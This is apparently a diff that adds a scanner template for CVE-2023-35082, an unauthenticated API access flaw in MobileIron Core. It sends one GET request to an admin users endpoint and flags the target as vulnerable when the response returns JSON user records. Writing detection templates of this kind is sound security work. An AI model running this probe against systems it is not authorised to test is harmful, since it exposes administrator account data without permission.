@@ -1,0 +1,25 @@
+id: poc-yaml-mobileiron-core-api-unauthorized-access
+info:
+  name: MobileIron Core Unauthorized Remote API Access (CVE-2023-35082)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve-2023-35082,unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mifs/asfV3/api/v2/admins/users"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "results"
+          - "userId"
+          - "name"
+      - type: word
+        part: header
+        words:
+          - "application/json"
